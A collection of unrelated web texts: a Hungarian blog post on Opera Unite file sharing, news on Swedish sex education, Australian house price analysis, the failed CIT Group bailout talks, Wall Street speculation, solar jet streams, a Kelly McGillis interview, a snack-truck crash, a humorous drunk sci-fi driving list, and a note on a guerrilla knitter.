Ja , bocs , nem , hiszen már online dokumentum a felh őjükben .
🙂
Nagy dolog .
A szenzitív adataimat meg úgyis 128 bites AES kódolású diszk imázsban tárolom .
Nem értem én az Operát , nem látom az innovációt .
( Én eleve nem akarnék innoválni egy marginális böngészőre épülve . )
Azt látom , hogy próbálkoznak .
És az mindig jó dolog .
update : máris kiderült egy nagyon komoly dolog az Opera Unite -ról , ugyanis ez a tökéletes DC ++ szerver .
Csak a szolgáltatónak kell Opera Unite - ot futtatnia , a többiek azonnal jöhetnek csetelni , letölteni MKV - ket .
Íme , itt megírom :
És percekkel később máris baráti diskurzus a twitterről :
Nem sokkal később dobisan megosztotta a V - TECH nevű mappáját , amin keresztül új tabban elkezdetm streamelni egy érzelmeset .
És ment , működött minden .

STOCKHOLM — Proper condom use , sex positions and same - sex relationships are all part of the curriculum for 14 - year - old students in Swedish high schools .
But many Muslim immigrants , who require their daughters and wives to wear head scarves to ensure modesty , have prevented their children from attending the classes .
A new law proposes to change that by abolishing a provision that was initially created for Catholic and Jewish students looking to get out of religious education classes .
All students were allowed to opt out of subjects if they wanted .
Without that provision , Muslim parents would no longer be able to stop their teenage children from participating in the mandatory sex education , or in sports lessons .
" All students have the right to take part in the compulsory school education , regardless of whether their parents approve or disapprove , " said Sweden 's education secretary , Jan Bjorklund .
Muslim parents who grew up in conservative Middle East countries have reacted with shock when their daughters and sons come home from school with condoms handed out by their biology teachers .
Teenage girls said their parents prohibit them from participating in school lessons because they contradict the family 's religion or culture , according to a new survey from Stockholm University .
Twenty - seven percent of immigrants ’ daughters are kept from participating in some school subjects .
“ My parents do not think that the school should run any sex education at all .
They say it is not the school ’s business .
But I think it is exciting .
I do not show the condoms for Mum or Dad , ” said Fatima Omed , 14 .
Her parents moved to Sweden from Turkey , but she has lived in Sweden her entire life .
“ I do not plan to use the condoms anytime soon , ” she added , laughing .
The number of students prevented by their parents from attending sex education classes increased during the Iraq war , when many Muslim families immigrated to Sweden .
The Scandinavian country , with 10 million inhabitants , granted full refugee status to 24,799 Iraqis between 2003 and 2007 , compared with 260 by Britain .
Sweden 's right - wing government said the increase in students opting out called for action .
Muslim parents who were born in Sweden have not used the exemption nearly as much as parents who are immigrants .
Families where both the parents and children are immigrants have expressed the most anger .
“ It is a problem and usually it is the father who is protesting the most , especially when it regards a daughter , ” said Magnus Ericsson , a teacher at one of Stockholm ’s largest high schools .
Although paternal protectiveness can be viewed as noble and admirable , Swedish medical experts think it 's counterproductive and potentially harmful for young women .
The classes are designed to educate students about sex before they reach 15 , the age of consent in Sweden .
“ The purpose of the sex education is to provide good information about how the body works , to make the students feel secure in their sexuality and to prevent sexual diseases and unwanted pregnancies , " said Ann - Cristine Jonsson of the Swedish National Institute of Public Health .
Students learn about HIV / AIDS , chlamydia , herpes and hepatitis , as well as other sexually transmitted diseases .
Condoms with different flavors , such as strawberry and orange , are handed out to the students .
“ We want to prevent both diseases and unwanted pregnancies , ” Jonsson said .
The students are also taught that it is normal to have intercourse with people of the same sex and that it is unacceptable to tease or bully classmates who are gay .
Sweden has required sex education be taught in its schools since 1955 and has earned a reputation as a sexually liberal country .
The 1967 landmark movie " I Am Curious ( Yellow ) , " which American author Norman Mailer called " one of the most important movies I have seen in my entire life , " helped solidify that reputation .
Last year , Sweden ’s state - run pharmaceuticals retailing stores launched a line of sex toys aimed at women .
The initiative was financed by taxes and within a few days the products became the chain ’s bestsellers .
Some members of the left - wing opposition expressed concern that some Muslim families would be so upset by the proposed change that they would pull their children out of public schools , thus increasing segregation in Sweden .
But for the most part , support for the law exists throughout the political spectrum .
The paragraph in question was designed decades ago to allow students to opt out of Christian education , which was erased in Swedish schools in 1969 and replaced by the broader subject of religious education .
Forty years later , amid an influx of Muslim immigrants , it is that paragraph that is set to be abolished .

Australian Property Prices
Property prices have always been a popular topic of conversation in Sydney , but the subject has become more contentious since the onslaught of the Global Financial Crisis .
Views on prospects for Australian property prices range from the bleakly pessimistic to the wildly optimistic .
Iconoclastic economist Dr Steve Keen is one of the more prominent pessimists and expects a fall in property prices of as much as 40 % .
At the other extreme , research firm BIS Shrapnel recently released forecasts that prices in capital cities will rise by almost 20 % over the next three years .
Of course , both sides have their critics .
Macquarie Bank economist Rory Robertson is so convinced that Keen is wrong that he has offered a wager in which the loser will have to walk to the top of Mount Kosciusko wearing a t - shirt saying “ I was hopelessly wrong on home prices !
Ask me how ” .
Meanwhile , many dismiss the optimists as mere shills intent on talking up the market in the interests of their clients .
Faced with a debate like this , the only recourse for the Stubborn Mule is to look at the data .
Fortunately , I have been able to get my hands on a rich set of data ( and ideas ) from University of New South Wales economist Dr Nigel Stapledon * .
Stapledon has painstakingly assembled data on Australian property prices back to the 1880s and rental data back to the 1960s .
This data underpins a detailed comparison of the Australian and US property markets in Stapledon ’s forthcoming paper “ Housing and the Global Financial Crisis : US versus Australia ” in The Economic and Labour Relations Review , Sydney .
By comparison , the House Price Indexes published by Australian Bureau of Statistics ( ABS ) commence in 1989 .
A first glance at Stapledon ’s index of Sydney property prices does indeed appear to show a meteoric trajectory that would inflame the passions of the pessimists .
Sydney House Price Index
Of course , asset prices tend to exhibit exponential growth , so it is far better to look at historical prices on a logarithmic scale .
This reveals a striking trend .
The growth of Sydney property prices has been remarkably consistent at around 9 % per annum over the last 50 years .
Sydney Property Prices ( log scale )
Prices for Australia overall show a similar trend , with average prices over the six major capital cities growing at an average of 8.6 % per annum since 1955 .
Australian Property Prices
What these charts do not take into account is the effect of inflation .
Indeed , inflation varied significantly over the last 50 years , so adjusting for the effect of inflation shows that the trend in Sydney house prices has not been so stable .
Booms such as those from 1987 - 1989 and 1997 - 2003 are made very clear in the chart below .
But it is also evident that prices have failed to keep up with inflation over the last few years .
Nevertheless , over the last 50 years , Sydney house prices have appreciated an average of 3.1 % over inflation and that is before taking rental income into account .
Sydney Prices ( inflation adjusted )
One difficulty with long - run property price data is that fact that observations are typically based on median house prices , which does not take into account changes in the quality of houses .
The median house in 2009 may be “ better ” than the median house in 1955 and changes in price may reflect this change in quality as well as price appreciation .
Stapledon has attempted to take this into account by constructing an index for Australian house prices ( six capital cities ) that is adjusted for both inflation and standardised to “ constant quality ” .
The trend in real prices , adjusted for quality over the period 1955 - 2009 has been an increase of 2.1 % per annum over inflation .
This compares to an increase of 2.7 % per annum over inflation without adjusting for quality .
So , at a national level , quality changes overstate the trend growth rate by 0.7 % .
While Stapledon has not constructed a quality - adjusted index for Sydney , assuming that the national trend applied would lead to the conclusion that Sydney house prices have a trend growth rate of 2.4 % over inflation .
Australian Prices ( quality and inflation adjusted )
Interesting though this historical exploration may be , the question we would like answered is where prices may head in the future .
One approach to the problem is to assume that growth in property values in real terms may change in the short term , but over the long term will revert to a long term trend .
Enthusiasts of trend following may see some significance in the fact that Australian prices still appear to be above the longer run trend , while Sydney prices have already fallen below trend .
Of course , depending on the time period used to determine the trend , very different conclusions may be reached .
If I were to base the trend on the full history from the 1880s , the last 50 years would appear to be well above trend .
Another popular approach is to consider housing affordability .
This approach either looks at ratios of house prices to income or ratios of housing servicing costs ( whether interest or rent ) to income .
The assumption is that these ratios should be stable over time and if increases in house prices result in reduced affordability this indicates the prices can be expected to fall in the future .
Stapledon is critical of this approach , arguing that :
while income is expected to be a major influence on prices , there is no theoretical reason for any fixed relationship between prices and income or between rents and income
Over time , people may change their priorities and place a greater or lesser importance on housing and , as a result , be prepared to spend a larger or smaller proportion of their income on housing .
Stapledon argues that a better approach is to examine rental yield , which is the ratio of rents to prices .
Since the property prices can be expected to keep pace with inflation ( and , in fact , outpace inflation ) , rental yields should be comparable to real yields ( i.e. yields over and above inflation ) on other asset classes .
The easiest real yields to observe are those of inflation - linked Government bonds .
The Reserve Bank of Australia publishes historical data for inflation - linked real yields back to the late 1980s .
The chart below compares these Government bond real yields to Stapledon ’s history of rental yields .
While the correlation is not perfect , both rental yields and real yields show a downward trend from the late 1980s / early 1990s which has only recently begun to reverse .
Since rents have not fallen over this period , this provides an explanation for the strong growth in property prices over that period .
Australian Rents and Inflation - Linked Bonds
So what could this approach tell us about property prices ?
Rental yields have already risen further than bond real yields , but certainly could go higher .
What this means for prices does also depend on where rents themselves may be headed .
The chart below shows the contribution of rents to consumer price inflation as published by the ABS .
While the rate of growth in rents has slowed , history would suggest that rents are unlikely to go backwards .
A cautious , but not overly pessimistic forecast could see rental increases falling to an annualised rate of 1 % while rental yields could climb back to 4 % .
The combined effect would be a fall of 12 % .
Since prices have already fallen by 7 % over the year to the end of March 2009 , this would amount to a fall of almost 20 % .
Rent Inflation ( Quarterly )
This is certainly a significant drop , but still half the fall that Keen expects to see .
For prices to fall by 40 % , even assuming rents remain unchanged rather than growing by 1 % , it would be necessary for real yields to rise to 5.8 % , which exceeds the record level since 1960 of 5.4 % .
On this basis , I find it hard to be as pessimistic as Keen .
Indeed , the latest data from RP Data - Rismark International suggests that prices are once again on the rise .
The next ABS release is a little over a month away , so it will be interesting to see whether they see the same recovery .
The relationship between rental yields and real yields is an interesting one , but ultimately does not provide definitive predictions , but rather an indication of a range of outcomes that would be precedented historically .
Of course , as Nassim Taleb has emphasised , unprecedented “ black swans ” can occur so history does not allow us to rule out more extreme events .
Furthermore , nothing here addresses the question why prices in the US have fallen so dramatically and yet Australian prices could suffer far milder falls .
That is the primary focus of Stapledon ’s paper and is a topic I may return to in a future post , but this one is long enough already !
UPDATE : In this post I noted that the historical data shows a marked shift in behaviour from the mid-1950s without providing any explanation as to the cause of this shift .
Needless to say this is a subject Stapledon has given some serious consideration , and I will quote from his doctorate , “ Long term housing prices in Australia and some economic perspectives ” :
From a longer term view , a key observation is the clear shift in direction in house prices and rents from circa the mid 1950s .
House prices , in particular , jumped significantly , best illustrated by the rise in the price to income ratio from about one : one to about 4:1 in the 2000s .
Looking at demand and supply variables …indicates that this shift in direction cannot be adequately explained in terms of the demand variables of income and household growth .
Supply side factors appear to be more crucial and there is a substantial literature emerging in the US emphasising the importance of supply side variables and specifically the propensity to regulate to constrain supply .
The evidence presented in this thesis of the lift in the cost of fringe land in the major urban areas provides prima facie evidence that supply factors have been a significant factor explaining the upward trajectory in house prices in Australia since the mid 1950s .
* I would like to thank Dr Stapledon for generously making his data available to me .
UPDATE : finally , I have published the post on why I do n’t think Australia ’s property market will experience the same fate as the US market .

WASHINGTON / NEW YORK ( Reuters ) - CIT Group Inc , a major lender to small - and mid-sized U.S. businesses , said on Wednesday that bailout talks with the government had ended , a development that heightened the chances the company would file for bankruptcy .
“ Discussions with government agencies have ceased , ” CIT said in a statement .
“ There is no appreciable likelihood of additional government support being provided over the near term . ”
CIT said its management , directors and advisers were evaluating alternatives .
The announcement followed last - ditch talks in which the Treasury Department had expressed concern about a worsening liquidity crunch at New York - based CIT , and indications that government aid would not put the lender on a path to recovery .
Treasury , in a later statement , said the government needed to keep the threshold high for exceptional aid to individual companies , adding that the United States had a powerful set of financing mechanisms to help restart overall credit markets .
Founded more than a century ago , CIT ’s problems mushroomed in recent years in the wake of Chief Executive Jeffrey Peek ’s decision to expand into potentially highly profitable but riskier areas such as subprime mortgages and student loans .
If it were to go bankrupt , it would join Lehman Brothers Holdings Inc and Washington Mutual Inc among large U.S. financial services companies to collapse since the credit crisis accelerated last September .
It would also show the possible limits of Washington ’s willingness to rescue companies , after multiple bailouts for much larger companies such as American International Group Inc and Citigroup Inc .
“ At least in the eyes of the Fed and the eyes of the Treasury , we ’ve turned the corner , such that the systemic kinds of risks facing the economy may be well past , ” said Mike Knebel , a portfolio manager at Ferguson Wellman Capital Management in Portland , Oregon , which recently sold CIT bonds .
Trading in CIT shares was halted on Wednesday afternoon , with the shares last trading at $ 1.65 , up 4 cents .
Standard & Poor ’s 500 stock futures were down 0.4 percent after - hours .
TARP MONEY NOT ENOUGH
CIT sought help even after it became a bank holding company in December so it could draw $ 2.33 billion of taxpayer money from the government ’s Troubled Asset Relief Program ( TARP ) .
Treasury had been considering an aid package that included a temporary loan to give CIT room to strengthen its balance sheet by raising additional capital through debt or equity , a person familiar with the matter had said .
Other options had been access to Fed ’s discount window , as well as asset transfers , the person said .
The person requested anonymity because the talks were private .
CIT ’s travails were a vexing problem for the Obama administration , which had proposed that Congress give the government the authority to unwind large , troubled financial firms in an orderly fashion .
Because regulators do not have that power yet , they had to decide whether to bail out a company whose collapse , while significant , would by itself likely not pose a “ systemic ” risk to the financial system .

Treasury has also been supportive of the Federal Deposit Insurance Corp granting CIT access to its government debt guarantee program , the person familiar said .
Asset transfers to CIT ’s banking unit would have required approval from regulators such as the FDIC , which is already heavy pressure to handle dozens if not hundreds of expected bank failures in the next couple of years .
The FDIC had also been reluctant to allow CIT to join other financial companies in issuing government - guaranteed debt under an existing program , believing that such options are designed for healthy institutions .
“ Not all firms have to be saved and the government has to draw the line at some point , ” said James Barth , an economist at the Milken Institute .
“ I do n’t think it ’s going to be a catastrophe or become another Lehman Brothers , given the FDIC ’s apparent concern about the quality of the assets . ”
An FDIC spokesman declined to comment .
CONGRESS , INDUSTRY GROUPS CONCERNED
While CIT has shed from some of its riskier businesses , it still faced too much debt , including some $ 10 billion coming due in the year ending March 31 , 2010 .
Barney Frank , chairman of the House Financial Services Committee , said earlier on Wednesday he hoped the government could come up with a structured aid package for CIT .
“ If CIT does n’t get structured help , then it will have a very negative effect , I ’m told , on small businesses around the country , ” he said in an interview with Reuters .
Indeed , industry groups such as the National Retail Federation had argued that CIT ’s tentacles extended too far throughout the country to allow failure .
Steve Bartlett , chief executive of the Financial Services Roundtable , said 10,000 small businesses could be choked off from needed funds if CIT were allowed to collapse .
“ This one is crystal clear , ” Bartlett said in an interview .
In the wake of The Great Financial Implosion of 2008 , we 've seen a major push to stop Wall Street from taking insane risks and blowing up our economy again .
On the other hand , hedge funds , Wall Street lobbyists , and financial commentators are warning about the possibility of " over- regulation . "
Their position -- that rules limiting risky speculation could reduce " financial innovation " and efficient pricing -- was exemplified in a March editorial in The Washington Times : " Speculators make money by reducing price differences .
... [ For example , ] they buy oil when it is still relatively plentiful and put it aside for when oil is expected to be scarce .
...
Markets have gotten extremely good at smoothing out these prices . "
Really ?
How 's that working out ?
Now , I forget a lot of things -- asparagus , chicken , and milk left to rot in the fridge .
But like you -- if you have heating bills , drive a car , or were conscious in 2008 -- I remember what happened to oil prices .
" Smooth " is not how I 'd describe them .
OK , so speculators did n't do such a great job smoothing out those prices , but at least we can concede that heightened speculation tended to ease oil 's volatility , right ?
Not so much
A prominent Forbes article tells the tale of an SEC and bankruptcy court investigation into possible oil price manipulation by a number of Wall Street firms that may have cost us up to $ 500 billion in higher oil prices .
Last year , Semgroup , the now - bankrupt oil pipeline giant , bet reckless amounts of money that oil prices would fall -- much of it against a Goldman Sachs ( NYSE : GS ) trading arm .
When that did n't happen and Semgroup ran into trouble , Goldman , along with Merrill Lynch and Citigroup ( NYSE: C ) , offered to help Semgroup raise money .
Goldman then reportedly examined Semgroup 's trading positions before retracting its offer .
Meanwhile , Semgroup was destroyed as a number of Wall Street firms bid oil prices up from the mid-$90s to $ 147 per barrel -- the biggest of those gains on no news .
After Semgroup collapsed , there was no reason to continue bidding oil higher , and prices promptly fell .
The results were windfall profits for one of Goldman 's trading arms and whichever firms participated in the short squeeze against Semgroup .
Oh yeah , and a possible $ 500 billion price tag , which , if you believe John Catsimatidis , is " how much the world would have overpaid for crude had a successful scam pushed up oil prices by $ 50 a barrel for 100 days , " reported to Forbes .
( Granted , Catsimatidis is n't an impartial bystander in this -- he 's been battling to gain control of the bankrupt Semgroup . )
If true , that money would 've benefitted not only ExxonMobil ( NYSE : XOM ) and other Big Oil players -- who garnered so much bad press for last year 's windfall profits -- but also places like Saudi Arabia , Iran , Russia , and Venezuela .
Not the first time this has happened
A similar confluence of events occurred in 1998 when a group including Goldman Sachs , Salomon Smith Barney , AIG , and others ganged up against Long Term Capital Management ( LTCM ) as Goldman and JPMorgan ( NYSE : JPM ) downloaded the faltering hedge fund 's trading files , according to interviews of the participants recounted in Roger Lowenstein 's expose of the debacle , When Genius Failed .
Far from reducing pricing inefficiencies , the banks ' actions and LTCM 's reckless accumulation of $ 1 trillion in derivatives made Treasury spreads go crazy and nearly brought down the entire financial system -- before the Fed stepped in to broker a bailout .
Is this the " innovation " we must protect ?
Stories like these and the recent blowup of the financial system -- in addition to common sense -- should make us suspicious when Wall Street complains that increased oversight could limit its ability to create amazing new " innovations . "
Remember that its most recent innovations , like credit default swaps and collateralized debt obligations cubed -- mind - bogglingly convoluted bundles of bundles of bundles of toxic mortgages -- not only had little practical function , but they nearly destroyed our economy , impacting even strong firms unrelated to the financial industry like Microsoft ( NASDAQ : MSFT ) .
As Berkshire Hathaway ( NYSE : BRK -A ) ( NYSE : BRK -B ) Vice Chairman Charlie Munger observed , " It is n't as though the economic world did n't function quite well without [ credit - default swaps ] , and it is n't as though what has happened has been so wonderfully desirable that we should logically want more of it . "
All of this has happened before and could happen again
Recently , when we asked Warren Buffett and Charlie Munger for their thoughts on the subject , they lamented that " even after this mess it 'll be tough to get anything passed " because , they said , Wall Street spent $ 500 million over the last decade in lobbying and financial contributions .
And given that lobbying efforts are now apparently intensifying , it 's not the specter of too much reform , but rather a return to business as usual for Wall Street that we should fear most right now .
Buffett has been warning for years that we need improved oversight over financial institutions -- especially on the use of derivatives and leverage -- so that we are n't faced with a repeat crisis , telling CNBC : " Derivatives enable people entirely to get around margin regulations .
...
So we need something new . "
Yes , our economy is facing tremendous challenges , but as Buffett reminded his shareholders , the United States has overcome two world wars , more than a dozen recessions , stagflation in the 1970s and early 80s , and massive unemployment during the Great Depression .
Yet despite these challenges , and without credit default swaps , Buffett explained that Americans ' standard of living rose seven - fold last century , while the Dow increased from 66 to 11,497 : " Though the path has not been smooth , our economic system has worked extraordinarily well over time .
It has unleashed human potential as no other system has , and it will continue to do so .
America 's best days lie ahead . "

A helioseismic map of the solar interior .
Tilted red - yellow bands trace solar jet streams .
Black contours denote sunspot activity .
When the jet streams reach a critical latitude around 22 degrees , sunspot activity intensifies .
The sun is in the pits of a century - class solar minimum , and sunspots have been puzzlingly scarce for more than two years .
Now , for the first time , solar physicists might understand why .
At an American Astronomical Society press conference today in Boulder , Colorado , researchers announced that a jet stream deep inside the sun is migrating slower than usual through the star 's interior , giving rise to the current lack of sunspots .
Rachel Howe and Frank Hill of the National Solar Observatory ( NSO ) in Tucson , Arizona , used a technique called helioseismology to detect and track the jet stream down to depths of 7,000 km below the surface of the sun .
The sun generates new jet streams near its poles every 11 years , they explained to a room full of reporters and fellow scientists .
The streams migrate slowly from the poles to the equator and when a jet stream reaches the critical latitude of 22 degrees , new - cycle sunspots begin to appear .
Howe and Hill found that the stream associated with the next solar cycle has moved sluggishly , taking three years to cover a 10 degree range in latitude compared to only two years for the previous solar cycle .
The jet stream is now , finally , reaching the critical latitude , heralding a return of solar activity in the months and years ahead .
" It is exciting to see " , says Hill , " that just as this sluggish stream reaches the usual active latitude of 22 degrees , a year late , we finally begin to see new groups of sunspots emerging . "
The current solar minimum has been so long and deep , it prompted some scientists to speculate that the sun might enter a long period with no sunspot activity at all , akin to the Maunder Minimum of the 17th century .
This new result dispells those concerns .
The sun 's internal magnetic dynamo is still operating , and the sunspot cycle is not " broken . "
Because it flows beneath the surface of the sun , the jet stream is not directly visible .
Hill and Howe tracked its hidden motions via helioseismology .
Shifting masses inside the sun send pressure waves rippling through the stellar interior .
So - called " p modes " ( p for pressure ) bounce around the interior and cause the sun to ring like an enormous bell .
By studying the vibrations of the sun 's surface , it is possible to figure out what is happening inside .
Similar techniques are used by geologists to map the interior of our planet .
In this case , researchers combined data from GONG and SOHO .
GONG , short for " Global Oscillation Network Group , " is an NSO - led network of telescopes that measures solar vibrations from various locations around Earth .
SOHO , the Solar and Heliospheric Observatory , makes similar measurements from space .
" This is an important discovery , " says Dean Pesnell of NASA 's Goddard Space Flight Center .
" It shows how flows inside the sun are tied to the creation of sunspots and how jet streams can affect the timing of the solar cycle . "
There is , however , much more to learn .
" We still do n't understand exactly how jet streams trigger sunspot production , " says Pesnell .
" Nor do we fully understand how the jet streams themselves are generated . "
To solve these mysteries , and others , NASA plans to launch the Solar Dynamics Observatory ( SDO ) later this year .
SDO is equipped with sophisticated helioseismology sensors that will allow it to probe the solar interior better than ever before .
" The Helioseismic and Magnetic Imager ( HMI ) on SDO will improve our understanding of these jet streams and other internal flows by providing full disk images at ever - increasing depths in the sun , " says Pesnell .
Continued tracking and study of solar jet streams could help researchers do something unprecedented -- accurately predict the unfolding of future solar cycles .
Stay tuned for that !

' I'm a lesbian , ' declares Top Gun siren Kelly McGillis
She has long been plagued by rumours about her sexuality .
But now Kelly McGillis , who made her name alongside Tom Cruise in the film Top Gun , has finally revealed she is gay .
The 51 - year - old actress , who has been married twice and who has two teenage children , has always denied suggestions that she had had lesbian relationships .
' I'm done with the man thing ' : Kelly McGillis pictured in 1989 film Cat Chaser , has been married twice , but has finally revealed she is gay
Miss McGillis , who is currently single , came out during an interview with lesbian website Shewired.com .
She has claimed to have battled with her sexuality for more than 40 years and that for long periods of her life she was convinced she was being ' punished by God ' for being gay .
Eighties pin-up : Kelly won a legion of male fans playing Tom Cruise 's love interest Charlie in Top Gun in 1986
However , she told the website that she had finally decided to ' move on with her life ' and admit she was a lesbian .
During the video interview , she was asked if she was single before being questioned over whether she would now date a man or a woman .
She replied : ' Definitely a woman .
I 'm done with the man thing . '
She added : ' It 's a part of being true to yourself .
That 's been a challenge for me personally . '
The actress married her first husband , Boyd Black , in 1979 but they split three years later .
Her second husband was California millionaire Fred Tillian , by whom she has daughters Kelsey , 19 , and Sonora , 16 .
The couple split in 2002 after 13 years together .
Miss McGillis said that it took her a long time to accept she was homosexual .
' I think that was an ongoing process from the time I was probably 12 , ' she said .
' It was a long arduous journey for me .
Moving on : Kelly with her ex-husband Fred Tillman in 1999
' I had a lot of things happen that convinced me God was punishing me because I was gay .
That was a hard process .
' Life is a journey and it's about growing and changing and coming to terms with who and what you are and loving who and what you are . '
Gritty film roles : Kelly played a prosecutor alongside Jodie Foster in The Accused in 1998
The actress became famous for playing U.S. Air Force training instructor Charlie Blackwood alongside Cruise in Top Gun in 1986 .
She also played Harrison Ford 's love interest in the Oscar - winning 1985 film Witness .
In 1982 , she was assaulted and raped in her home by an intruder .
She relived the ordeal in 1988 when she played a lawyer fighting for a rape conviction in The Accused , the film for which Jodie Foster won an Oscar for her portrayal of the victim .
In 2001 , she played an English professor who has a relationship with a woman detective in the film Monkey 's Mask .
She said at the time : ' I knew this movie would start all that lesbian thing up again and it does n't bother me .
' It is n't about me coming out but if people want to think that , that 's fine .
I do n't care . '
She also denied she was homosexual after an appearance in U.S. drama
The L Word in 2007 , which portrayed the lives of lesbian women .

When times are tight and people are hungry , any kind of waste - even the deep - sixing of a truck load of junk food - is taboo .
That may explain why no one seems to want to take the blame for sending what were 2,000 cases of perfectly good snack cakes to the landfill after a Little Debbie truck overturned on Oregon 217 late Monday .
McKee Foods , the Tennessee manufacturer of the sugary snacks , accuses the Oregon Department of Transportation of destroying the high - calorie cargo in its rush to reopen the " flyover " exit ramp crossing Interstate 5 .
ODOT , however , said the company told its late - night crash - response crew that its snack rolls were toast once the truck 's trailer , with its grinning , country - girl Debbie logo , flipped on its side .
Never mind that the goodies -- from brownies and donuts to Swiss Rolls and Little Debbie 's new 100 - calorie cookies - and - creme cakes -- remained boxed and sealed up .
" With the Oregon Food Bank having a hard time getting food for the poor , it just seemed like a big waste , " said Christine Miles , an ODOT spokeswoman .
" There was nothing wrong with the boxes . "
Tigard police say the driver of the truck , 34 - year - old Justin Rush of Kingman , Ariz . , was speeding when he exited I - 5 and took the northbound ramp at about 10:40 p.m .
" The truck was traveling too fast to negotiate the turn , " said Tigard police spokesman Jim Wolf .
The truck and trailer rolled onto the passenger side , skidding before coming to a stop .
Rush , who was cited for speeding , was n't injured .
An ambulance took a passenger complaining of back pain to a nearby hospital , Wolf said .
Meanwhile , the Little Debbie truck , which was delivering snack cakes to distributors around the Northwest , blocked the 217 flyover .
Despite the impact , the trailer 's rear doors stayed closed .
No cakes spilled onto the highway .
Chris Sullivan , safety and compliance manager for McKee Foods Corp. , said a phone call about the crash woke hime at 1:45 a.m. in Collegedale , Tenn .
ODOT said it needed to unload the trailer to tip it upright .
Sullivan said he told state transportation officials that he would send a truck with a local supervisor from McKee 's insurance company right to the scene to salvage the cakes .
It would be quick , he promised .
Sullivan said he wanted to save as many cakes as possible to sell for a discount at Little Debbie " thrift stores . "
But it needed to be supervised by a local quality - assurance specialist .
ODOT responded that it needed to get the freeway open as soon as possible , according to Sullivan .
" Until they tore that trailer open , there was nothing wrong with the food , " Sullivan said .
" ODOT exposed it to the ground , dump trucks and a front loader . "
Miles , however , said the company told its team that snacks could n't even be donated to the food bank because the crash had made them inedible .
" Most of them were n't touched , " she said .
ODOT workers spent nearly three hours unloading the boxes from the trailer and putting them in a dump truck .
Tuesday morning , the snacks waited in a pile on the pavement at an ODOT maintenance facility in Washington County .
Crows reportedly scavenged in boxes that had busted open as they were dumped at the site .
An insurance adjuster waited for dumpsters to arrive .
Of course , the disagreement about who wasted the Little Debbies begs another question : Would the Oregon Food Bank even want something with such little nutritional value ?
Everyone has a sweet tooth , said Jean Kempe - Ware , an Oregon Food Bank spokeswoman .
" When people are hungry , " she said , " they need calories .
Sometimes , it 's a nice little treat . "
Kempe - Ware said the food bank has staff members who can be called out to check whether food that was thought to be spoiled can is actually still acceptable for consumption .
In fact , she said , a manager with the food bank was in a race this morning against the dumpsters headed to the ODOT facility .
Maybe some of the Little Debbies can be saved and the insurance adjuster can be convinced to donate them .
" We do n't turn away food , " Kempe - Ware said .

Here on present - day earth , we have very strict laws in place to deter and severely punish folks who would risk their lives and the lives of fellow roadsters by driving under the influence of Jager Bombs and / or Irish Car Bombs .
And these laws exist in a time when our vehicles need rubber wheels and paved roads in order to move forward , and physical laws like " gravity " and " acceleration " still need to be adhered to .
If we can't successfully operate vehicles with two pedals and a steering wheel , with a .09 alcoholic blood level without slamming into a deli , then we should never get behind the touch pads , handle bars , joy sticks or laser cannons of any of these sci- fi vehicles .
The Delorian from Back to The Future
Aside from the fact that you 'd need to hit 88 mph without sideswiping into a bus , you should never mix booze with time travel .
As a joke you 'd set the clock to when your best friend 's mom was young , and when you came back to the present your best friend would now have your ears .
Not funny .
You 'd try to live out your old high school " If I knew then what I know now " fantasies , travelling through time to hit on the girls you did n't have the flux capacitors to back when you were a pimply - faced teenager .
The only problem is you 'd be wasted .
So not only would those girls be wondering why you parked your car from the future on the cafeteria lunch lady , but they'd be horrified to see an older , drunker , slurrier version of that kid they do n't talk to in geography class , stumbling over to them with lines like " HHhhhheey !
You know that sssound you 've been looking for ?
Welll chcheck this out ! " zzzzipp .
You 'll be in jail in no time , charged with running over the lunch lady , and for indecently unzipping your mcfly .
Speeders from Return of the Jedi
If you can't walk a straight line on a sidewalk without bumping into a parking meter , then there 's no way in hell you'd be able to pilot one of these babies through the dense forests of Endor without crashing and becoming a permanent tree hugger .
Even as a kid watching the POV speed racer scenes I remember thinking " I would n't last more than 30 seconds on these things !
How do they squeeze through trees that are no wider apart than a stop sign ? "
Just look at what happened when an Ewok speeder - jacked one of those crotch rockets , and he was completely sober !
Gunstar from The Last Starfighter
For anyone born after 1980 , you probably have no idea what the heck The Last Starfighter is all about .
But for any sci- fi nerds who are a little bit older this movie was the s**t .
It instilled little boys with the fantasy that if you master a videogame , you may be whisked off to space to participate in galactic warfare .
Now , you may feel that because the controls of the " Gunstar " are similar to those of the videogame , that you can get smashed and " step aboard " like you do with your buddies on a Saturday night .
Well , assuming you 're inebriated memory can retain the pre-flight checklist , you 're sure to spray the windshield while filling up the cockpit with vomit after you drunkenly activate the " weapon of last resort . "
Light Cycles from Tron
Flynn is an expert gamer with incredible reflexes , you are a drunk accountant that uses public transportation .
Good luck on one of these badboys .
Pod Racers from The Phantom Menace
The fact that Anakin Skywalker 's father is The Force and that he has more metachlorians than Yoda is the only reason a human is able to compete in the Pod Races on Tatooine .
As Qui Gon Jinn notes , Anakin 's lighting reflexes are due to the fact that he is able to " see things before they happen . "
So , given that you 're not the " chosen one , " and that you probably do n't have a Jedi 's ability to predict the future , and that you 're reflexes have been slightly altered by those 12 tequila shots , the Pod Racer is definitely a vehicle to steer clear of .
Imagine being pulled by a two - horse carriage .
Now replace the horses with giant rockets .
Continue drinking .
Now imagine trying to steer those rockets as they drag you across the dessert , with Sand People shooting at you .
I do n't even recommend playing the videogame while under the influence , as the subsequent motion sickness would surely cause you to fill your own pockets with spew .
Star Ship Enterprise
How many times have you misspelled words while operating MSN drunk ?
How many times have you misspelled a word while typing sober ?
While these mistakes are relatively harmless on earth , they could be fatal while using the navigational touch screens aboard a Federation Starship .
Nothing would be more disastrous than hearing Jean - Luc Picard command you to " Make it so , " and your sloppy fingers drunkenly set the USS Enterprise on a direct course to the center of planet Vulcan , warp factor 7 .
Romulan ale is illegal for a reason !
The Nebuchednezzar from the Matrix
Invisibility is key when attempting to navigate these hover crafts through the tunnels and sewers of a machine - ravaged planet earth .
One wrong move through these narrow passageways and your presence could alert the Sentinels : Metallic octopus - looking killing machines who are programmed to rip your face off .
So if you 're aboard one of these things you 've already taken the red pill , you 've been pulled out of the Matrix where sushi and meatball sandwiches were readily available , and now you 're forced to eat cream - of - slop three times a day , while wearing a burlap sack and with your body covered with plug holes .
This would drive anyone to heavy , heavy drinking .
So while you 're off duty , no one will blame you for drowning your sorrows with some alcoholic axle grease , but make sure you 're sober if you 're behind the wheel .
A Taxi Cab from The Fifth Element
Driving drunk is tough enough on roads with cars to the right and left of you .

SHE has tagged the Louvre , she has wrapped up Washington , she has crocheted London 's Soho , not to mention Seattle , New York and Hollywood .
Now it is time for Magda Sayeg , guerilla knitter , to stitch up Sydney .
